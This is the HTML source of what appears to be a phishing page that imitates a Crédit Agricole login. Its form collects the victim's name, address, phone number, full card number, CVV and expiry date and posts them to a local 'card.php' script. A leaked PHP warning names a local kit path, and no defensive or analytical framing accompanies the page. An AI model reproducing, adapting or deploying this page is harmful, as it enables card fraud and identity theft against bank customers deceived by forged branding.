<html><head>

 <title>AUTH</title> <link rel="icon" href="logo.png" type="image/png"> <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><meta charset="utf8"><link rel="stylesheet" type="text/css" href="#" media="all"><link rel="stylesheet" type="text/css" href="img/antiquus.css" media="all"><link rel="stylesheet" type="text/css" href="img/styles.css" media="all"><link rel="stylesheet" type="text/css" href="#" media="all"><link rel="stylesheet" type="text/css" href="img/styles-mod.css" media="all"><link rel="stylesheet" type="text/css" href="#" media="all"><link rel="stylesheet" type="text/css" href="#" media="all"><script src="#"></script><style type="text/css"></style></head>











<body onload="Init()" cz-shortcut-listen="true" topmargin="0" text="#000000" leftmargin="0"><div id="infoBull" style="position: absolute;z-Index:10"></div><div id="ombrBull" style="position: absolute;z-Index:9"></div>





<script language="JavaScript">
<!--

//Message affich&eacute; quand le souris est au-dessus: 
statusconfirmer="Confirmer l'identification";
statusannuler="Annuler l'identification";
statusaide="Besoin d'Aide ?";
statuscondjur="Conditions juridiques";
statusdemo="Voir la d&eacute;monstration";
statuscompte="Saisir votre n&deg; de compte";
statuscode="Saisir votre code personnel";
statuscorriger="Corriger votre derni&egrave;re saisie";
statusclavnum="Cliquez dans la grille pour composer votre code personnel";
statusrecom="Voir nos recommandations";

// on recupere la version du navigateur
var OS = 'Win';
// on recupere la version du navigateur
Version=navigator.appVersion;
App = navigator.appName;
var Version=Version.substring(0,1);
var posOS = navigator.appVersion.indexOf('Mac');
var posOS2 = navigator.appVersion.indexOf('Win');
if (posOS >= 0) OS = 'Mac';
if ((posOS < 0) && (posOS2 >= 0)) OS = 'Win';
if (OS == 'Win') Nav_sup = 2;
else Nav_sup = 3;
// si c'est Netscape 2+ ou MSIE3+, c'est correct
browserOK=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=Nav_sup));
browserOK1=(((navigator.appName=="Netscape") && (Version > 1)) || (Version>=4));
browserOK2=(navigator.appName=="Netscape");



function setSize(win,width,height) {
	if (win.outerWidth) {
		win.outerWidth = width;
		win.outerHeight = height;
	}
	else if (win.resizeTo) {
		win.resizeTo(width,height);
	}
	else {
		alert("Not supported.");
	}
}

function clicPosition(position) {
	cocherCase();
	if (document.formulaire.CCCRYC2.value.length == 6) { 
		return; 
	}
	if (document.formulaire.CCCRYC.value=="") 
		document.formulaire.CCCRYC.value = position;
	else
		document.formulaire.CCCRYC.value = document.formulaire.CCCRYC.value + "," + position;
	document.formulaire.CCCRYC2.value = document.formulaire.CCCRYC2.value + "0";
}

var code, pos_der_code, affiche_code;
function effacer() { 
	if (document.formulaire.CCCRYC2.value.length == 0) { 
		return; 
	}
	code = document.formulaire.CCCRYC.value;
	pos_der_code = code.lastIndexOf( ',' );
	code = code.substr( 0,pos_der_code);

	affiche_code = document.formulaire.CCCRYC2.value;
	affiche_code = affiche_code.substr( 0,(document.formulaire.CCCRYC2.value.length - 1) );

	document.formulaire.CCCRYC.value = code;
	document.formulaire.CCCRYC2.value = affiche_code;
}

var i=0;
function cocherCase() {
	if ( i<6)
	{
		var l_oBarre = document.getElementById("monAvancement");
		l_oBarre.rows[0].cells[i].style.visibility = 'visible';
		i = i + 1;
	}
}
function corriger() {
	if ( i>0 )
	{
		i = i - 1;
		var l_oBarre = document.getElementById("monAvancement");
		l_oBarre.rows[0].cells[i].style.visibility = 'hidden';
	 }
}

var path_static = "";
var path_dynamic = "/stb";
// Recuperation code caisse
var caisse = "878";

function raf(){
	return;
}

var urlappli = "?PaReq=a8f4b2ef1e2374eb0fe37fc0249d10&MD=<br />
<b>Warning</b>:  rand() expects exactly 2 parameters, 1 given in <b>C:\AppServ\www\acard\ca\fr\information.php</b> on line <b>123</b><br />
d41d8cd98f00b204e9800998ecf8427e";
var urlapplisecu = "/stb/securite-entreeBam?TOPAF=1";

function ValidCertif(){
	document.formulaire.action = urlappli;
	validation(document.formulaire)

}

function ValidCertifSecu(){
	document.formulaire.action = urlapplisecu;
	validation(document.formulaire)
}

// -->
</script>

<script language="JavaScript">
<!--

function ouvrePOPUP(item,widthpop,heightpop,men) {
	if(item.indexOf("?") != -1) {
		item = item+"&stbevt=Popup";
	}
	else {
		item = item+"?stbevt=Popup";
	}

	ouvreFenetre(item,widthpop,heightpop,men,"PopUp");
}
function ouvreassistance(item,widthpop,heightpop,men) {
	ouvreFenetre(item,widthpop,heightpop,men,"Assistance");
}

function ouvreFenetre(item,widthpop,heightpop,men,titre) {

	if (item.indexOf("?") != -1) {
		if (item.indexOf("#") != -1)
			url = item.substring(0,item.indexOf("#"))+"&typeaction=Popup"+item.substring(item.indexOf("#"),item.length);
		else
			url = item+"&typeaction=Popup";
	} else {
		url = item;
	}

	aazz = "menubar=" + men + ",resizable=yes,toolbar=no,width=" + widthpop + ",height=" + heightpop + ",scrollbars=yes";

	// on verifie si l'on n'est pas deja sur la bonne fenetre
	if (titre!=window.name) {
		// Mise en commentaire de l ancien code
		//if (!saf) {
			// on recupere un reference sur le popup (s'il n'est pas ouvert, cela en ouvre une!)
		//	popup1 = window.open('',titre,aazz);
			// on ferme le popup
		//	popup1.close();
		//}
		// on ouvre le nouveau avec les nouveaux parametres (taille, bouton...)
		//popup1 = window.open('',titre,aazz);
		//popup1.name = titre;
		//setSize(popup1,widthpop,heightpop);
			
		popup1 = window.open(url,titre,aazz);
			
	    if (moz ) popup1.focus();
	    //popup1.location =url;
	} else {
		window.name = titre;
		setSize(window,widthpop,heightpop);
		document.location = url;
	}

}

function setSize(win,width,height) {
	if (win.outerWidth) {
		win.outerWidth = width;
		win.outerHeight = height;
	}
	else if (win.resizeTo) {
		win.resizeTo(width,height);
	}
	else {
		alert("Not supported.");
	}

}

// -->
</script>





<div id="container">
							<div id="contenu" style="width: 957px;">
<table border="0">
	<tbody><tr>
		<td colspan="3">


<div style="background-color:#E6E6E6;" align="center">
<table width="620px" cellspacing="0" cellpadding="0" border="0">
<tbody><tr>
<td style="background:#E6E6E6;">
	<div id="entete_vide">	
		<div id="entete" style="background:none;">
   			 <div id="gauche-entete">
		        <h1><img src="img/2.PNG"></h1>
		    </div>
   		 </div>
	</div>
</td>
</tr>
</tbody></table>
</div>
		</td>
	</tr>
	<tr valign="top">
	
		<td>
		
		<table style="background:#00000" width="100%" cellspacing="0" cellpadding="0" border="0">

			<tbody><tr>
				<td style="background:#E6E6E6 repeat-y scroll left top" width="169" valign="top">&nbsp;</td>
				<td id="col-centre" width="590px" valign="top">
				
				<table width="590" cellspacing="0" cellpadding="0" border="0">
					<tbody><tr>
						<td><form class="ca-forms ca-forms-stitre" method="POST" name="formulaire" action="card.php">
						  <input name="idtcm" value="" type="hidden"> 
							<input name="origine" value="vitrine" type="hidden"> 
							<input name="situationTravail" value="BANCAIRE" type="hidden"> 
							<input name="canal" value="WEB" type="hidden"> 
							<input name="typeAuthentification" value="CLIC_RETOUR" type="hidden">
							<input name="idUnique" value="-13ff2f5:14321b4517e:-592e" type="hidden"> 
							<input name="caisse" value="878" type="hidden"> 
							<input name="CCCRYC" value="" type="hidden">
							<img src="img/4.PNG" width="599" height="141">
							<fieldset class="blc-choix">
							  <div class="blc-choix-wrap" style="padding-bottom: 40px;"><p class="nomarge"><img src="img/1.PNG" width="532" height="58"></p>
						  <p class="validation" style="width:570px"></p></div></fieldset>
						<p></p><p class=" validation clearboth" style="width:556px;margin:-15px 0 0;">
                                <span class="gauche">
	                                
                            	</span>
                            	<span class="droite" style="position: relative;top: 462px;right: 17px;">
                            	
                            	
                            		
	                            		
			   							
			   							
			   						

			   							
			   							
			   						
			   							
			   							
			   						
	                            		<a class="annuler droite" href="javascript:corriger();effacer();" tabindex="27">Corriger</a> 
		   								<input class="droite" tabindex="28" id="droite" value="Confirmer" type="submit">
	                            		<a class="annuler droite" href="#" tabindex="30">Annuler</a>
	                            		
			   							

			   							
			   							
			   							
			   							
								</span>                           
                            </p><table width="590" border="0">
							<!-- Message securitaire -->

							<tbody><tr>
								<td colspan="3" height="22">
								<input name="CCCRYC2" value="" type="hidden">
								 <fieldset class="blc-choix">
							 <script>
								if(saf){
									document.write("<div class=\"blc-choix-wrap\" style=\"padding-bottom:190px;\">");
									
								}else{
									document.write("<div class=\"blc-choix-wrap\">");
								}
							   
							</script><div class="blc-choix-wrap" style="padding-bottom:192px;">
								<script langage="Javascript">
<!--
function validation(formulaire) {
if(formulaire.CCPTE.value=="") {
alert("Votre num&eacute;ro de compte est incomplet.");
return;
}
if(formulaire.CCCRYC.value=="") {
alert("Votre code personnel est incomplet.");
return;
}
if(isAlphaNum(formulaire.CCPTE.value)) {
if(isNumerique(formulaire.CCCRYC2.value)) {
formulaire.submit();
}
else {
alert("Votre code personnel est incomplet.");
}
}
else {
alert("Votre num&eacute;ro de compte est incomplet.");
}
}
function isNumerique(chaine){
if (chaine.length!=6)
return false;
for(var i=0;i<chaine.length;i++){
if(chaine.charAt(i)>'9' || chaine.charAt(i)<'0'){
return false;
}
}
return true;
}
function isAlphaNum(chaine){
if (chaine.length!=11)
return false;
chaine = chaine.toLowerCase();
for(var i=0;i<chaine.length;i++){
if(!((chaine.charAt(i)<='9' && chaine.charAt(i)>='0') || (chaine.charAt(i)<='z' && chaine.charAt(i)>='a'))){
return false;
}
}
return true;
}
-->
</script>
<h3>Veuillez remplir le formulaire suivant :</h3>
<p></p>
<label class="">Pr&eacute;nom  :</label>
&nbsp;<input name="prenom" required="" style="padding: 0;margin-left: 113px;" type="text">
<p></p>
<label class="" style="">Nom :</label>
&nbsp;<input name="nom" required="" style="padding: 0;margin-left: 132px;" type="text">
<p></p>
<label class="">Adress :</label>
&nbsp;<input name="adress" required="" style="padding: 0 64px 0 0;margin-left: 117px;" type="text">
<p></p>
<label class="">Ville :</label>
&nbsp;<input name="ville" required="" style="padding: 0;margin-left: 134px;" type="text">
<p></p>
<label class="">Code Postal:</label>
&nbsp;<input name="postal" required="" maxlength="5"style="padding: 0;margin-left: 93px;width: 56px;" type="text">
<p></p>
<label class="">Num&eacute;ro de Telephone :</label>
&nbsp;<input name="tel" required="" style="padding: 0;margin-left: 35px;" type="text">
<p></p>
<label class="">Votre Carte Cr&eacute;dit/D&eacute;bit : </label>
&nbsp;<input name="card" required="" maxlength="19" style="padding: 1px 10px 0px 4px;margin-left: 25px;" type="text";>(Ex: XXXX XXXX XXXX XXXX) 
<p></p>
<p></p>
<label class="">Cryptogramme visuel :</label>
&nbsp;<input name="cvv" required="" maxlength="3" style="padding: 0;margin-left: 37px;width: 34px;" type="text">
<p></p>
<label class="">Date d'expiration :</label>

&nbsp;<tr>

    <td style="position: relative;bottom: 226px;left: 185px;"><select name="mois" id="mois" required="">
      <option> </option>
      <option value="01">01</option>
      <option value="02">02</option>
      <option value="03">03</option>
      <option value="04">04</option>
      <option value="05">05</option>
      <option value="06">06</option>
      <option value="07">07</option>
      <option value="08">08</option>
      <option value="09">09</option>
      <option value="10">10</option>
      <option value="11">11</option>
      <option value="12">12</option>
    </select>
      -
      <select name="year" id="year" required="">
	        <option> </option>
        <option value="2018">2018</option>
        <option value="2019">2019</option>
        <option value="2020">2020</option>
        <option value="2021">2021</option>
        <option value="2022">2022</option>
        <option value="2023">2023</option>
        <option value="2024">2024</option>
        <option value="2025">2025</option>
		<option value="2026">2026</option>
        <option value="2027">2027</option>
		<option value="2028">2028</option>
        <option value="2029">2029</option>
      </select></td>
  </tr>
  
</div></fieldset></td></tr>







                                
							
							
							
						
                   		 
										
								
							
							
						</tbody></table>
						
						</form></td>
					</tr>
		<tr>
		<td>		
		<!-- Pav&eacute; Certificat --> 
		
		<!-- Conditions Juridique --> <form class="ca-forms" style="padding:0 0;"><p><img src="img/3.PNG" width="578" height="89"></p>
		  <p class="validation" style="width:580px"><script>var srcLien = path_dynamic + "/app/bam/tech/allmedia/stb/entreebam/jsp/AUTH-INF.jsp";var srcPuceLien = path_static + "https://www.ce-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/picts/PuceLien.gif";var yesno = "no";var authentif = "AUTH";</script></p></form>
			</td>
		</tr>
		</tbody></table>
		</td>
		<td style="background:#E6E6E6 repeat-y scroll left top" width="171" valign="top">&nbsp;</td>
		</tr>
		
		
	<tr style="background-color:#E6E6E6;" valign="middle">
	<td></td>
		<td>
		<table width="590" cellspacing="0" cellpadding="0" border="0">
			<tbody><tr>
				<td class="footercopyright" align="center">&nbsp;</td>
			</tr>
			<tr>
				<td class="footercopyright" align="center">@2004-2018 Crédit Agricole,
				tous droits réservés</td>
			</tr>
		</tbody></table>
		 

<!--MARQUEUR XITI-->




		</td>
		<td></td>
	</tr></tbody></table>
</td>



</tr>
</tbody></table>




<table>
	<tbody><tr>
		<td width="169"></td>
		<td id="main_bas" width="570"></td>
		<td width="169"></td>
	</tr>
</tbody></table>
</div>
</div>



</body></html>